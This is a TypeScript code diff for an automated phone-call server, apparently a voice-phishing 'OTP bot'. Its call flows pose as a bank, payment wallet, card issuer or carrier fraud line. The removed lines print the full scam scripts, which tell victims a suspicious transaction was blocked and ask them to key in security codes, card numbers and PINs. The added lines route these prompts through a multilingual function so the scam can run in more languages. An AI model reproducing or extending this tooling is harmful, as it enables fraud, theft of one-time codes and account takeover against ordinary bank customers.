@@ -2,11 +2,13 @@
 import { Response } from 'express';
 import { bot } from '..';
 import { v4 as uuidv4 } from 'uuid';
+import { getLangDTMFFlow } from '../languages';
+import { Language } from '../types';
 
 export const bankFlow = async (
   dtmf: string,
   res: Response,
-  language: string,
+  language: Language,
   chatId: number | undefined,
   step: string,
   destination: string,
@@ -31,7 +33,7 @@ export const bankFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
+            payload: getLangDTMFFlow({ dtmf, language, step }),
             language,
             voice: 'female',
           },
@@ -78,7 +80,7 @@ export const bankFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
+            payload: getLangDTMFFlow({ dtmf, language, step }),
             language,
             voice: 'female',
           },
@@ -117,7 +119,7 @@ export const bankFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `We have BLOCKED a recent SUSPICIOUS transaction on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
+            payload: getLangDTMFFlow({ dtmf, language, step }),
             language,
             voice: 'female',
           },
@@ -156,7 +158,7 @@ export const bankFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
+            payload: getLangDTMFFlow({ dtmf, language, step }),
             language,
             voice: 'female',
           },
@@ -173,7 +175,7 @@ export const bankFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS transaction on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
+            payload: getLangDTMFFlow({ dtmf, language, step }),
             language,
             voice: 'female',
           },
@@ -208,7 +210,7 @@ export const bankFlow = async (
 export const payFlow = async (
   dtmf: string,
   res: Response,
-  language: string,
+  language: Language,
   chatId: number | undefined,
   step: string,
   destination: string,
@@ -233,7 +235,7 @@ export const payFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
+            payload: getLangDTMFFlow({ dtmf, language, step, wallet }),
             language,
             voice: 'female',
           },
@@ -279,7 +281,7 @@ export const payFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
+            payload: getLangDTMFFlow({ dtmf, language, step, wallet }),
             language,
             voice: 'female',
           },
@@ -318,7 +320,7 @@ export const payFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
+            payload: getLangDTMFFlow({ dtmf, language, step, wallet }),
             language,
             voice: 'female',
           },
@@ -361,7 +363,7 @@ export const payFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
+            payload: getLangDTMFFlow({ dtmf, language, step, wallet }),
             language,
             voice: 'female',
           },
@@ -378,7 +380,7 @@ export const payFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
+            payload: getLangDTMFFlow({ dtmf, language, step, wallet }),
             language,
             voice: 'female',
           },
@@ -417,7 +419,7 @@ export const payFlow = async (
 export const accountFlow = async (
   dtmf: string,
   res: Response,
-  language: string,
+  language: Language,
   chatId: number | undefined,
   step: string,
   destination: string,
@@ -441,7 +443,7 @@ export const accountFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `For your SECURITY and to BLOCK this login attempt, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
+            payload: getLangDTMFFlow({ dtmf, language, step }),
             language,
             voice: 'female',
           },
@@ -488,7 +490,7 @@ export const accountFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `For your SECURITY please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the code yet please press the star key followed by the pound key.`,
+            payload: getLangDTMFFlow({ dtmf, language, step }),
             language,
             voice: 'female',
           },
@@ -527,7 +529,7 @@ export const accountFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
+            payload: getLangDTMFFlow({ dtmf, language, step }),
             language,
             voice: 'female',
           },
@@ -566,7 +568,7 @@ export const accountFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
+            payload: getLangDTMFFlow({ dtmf, language, step }),
             language,
             voice: 'female',
           },
@@ -583,7 +585,7 @@ export const accountFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
+            payload: getLangDTMFFlow({ dtmf, language, step }),
             language,
             voice: 'female',
           },
@@ -618,7 +620,7 @@ export const accountFlow = async (
 export const cardFlow = async (
   dtmf: string,
   res: Response,
-  language: string,
+  language: Language,
   chatId: number | undefined,
   step: string,
   destination: string,
@@ -641,7 +643,7 @@ export const cardFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
+            payload: getLangDTMFFlow({ dtmf, language, step, cardType }),
             language,
             voice: 'female',
           },
@@ -687,7 +689,7 @@ export const cardFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `For your SECURITY, please enter your ${cardType} card number followed by the pound key.`,
+            payload: getLangDTMFFlow({ dtmf, language, step, cardType }),
             language,
             voice: 'female',
           },
@@ -726,7 +728,7 @@ export const cardFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
+            payload: getLangDTMFFlow({ dtmf, language, step, cardType }),
             language,
             voice: 'female',
           },
@@ -765,7 +767,7 @@ export const cardFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
+            payload: getLangDTMFFlow({ dtmf, language, step, cardType }),
             language,
             voice: 'female',
           },
@@ -782,7 +784,7 @@ export const cardFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS online purchase, your ${cardType} card details was used. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
+            payload: getLangDTMFFlow({ dtmf, language, step, cardType }),
             language,
             voice: 'female',
           },
@@ -817,7 +819,7 @@ export const cardFlow = async (
 export const pinFlow = async (
   dtmf: string,
   res: Response,
-  language: string,
+  language: Language,
   chatId: number | undefined,
   step: string,
   destination: string,
@@ -840,10 +842,7 @@ export const pinFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload:
-              pinType === 'carrierPin'
-                ? `To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
-                : `For your security and to protect your account. Enter your ${pinType} followed by the pound key.`,
+            payload: getLangDTMFFlow({ dtmf, language, step, pinType }),
             language,
             voice: 'female',
           },
@@ -889,10 +888,7 @@ export const pinFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload:
-              pinType === 'carrierPin'
-                ? `To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
-                : `For your security and to protect your account. Enter your ${pinType} followed by the pound key.`,
+            payload: getLangDTMFFlow({ dtmf, language, step, pinType }),
             language,
             voice: 'female',
           },
@@ -931,10 +927,7 @@ export const pinFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload:
-              pinType === 'carrierPin'
-                ? `There as been a suspicious activity on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`
-                : `We recently noticed a SUSPICIOUS activity on your CARD. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
+            payload: getLangDTMFFlow({ dtmf, language, step, pinType }),
             language,
             voice: 'female',
           },
@@ -973,10 +966,7 @@ export const pinFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload:
-              pinType === 'carrierPin'
-                ? `You have selected an INVALID option. There as been a suspicious activity on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`
-                : `You have selected an INVALID option. We recently noticed a SUSPICIOUS activity on your CARD. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
+            payload: getLangDTMFFlow({ dtmf, language, step, pinType }),
             language,
             voice: 'female',
           },
@@ -1011,7 +1001,7 @@ export const pinFlow = async (
 export const pgpFlow = async (
   dtmf: string,
   res: Response,
-  language: string,
+  language: Language,
   chatId: number | undefined,
   step: string,
   destination: string,
@@ -1053,7 +1043,7 @@ export const pgpFlow = async (
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `You have selected an INVALID option. Welcome to the ${institutionName} fraud prevention line. We recently notice a SUSPICIOUS activity on your account. If this was you, simply HANG UP. If this was not you, PLEASE press ONE to speak to a ${institutionName} representative; to better assist you in SECURING your ACCOUNT.`,
+            payload: getLangDTMFFlow({ dtmf, language, step, institutionName }),
             language,
             voice: 'female',
           },
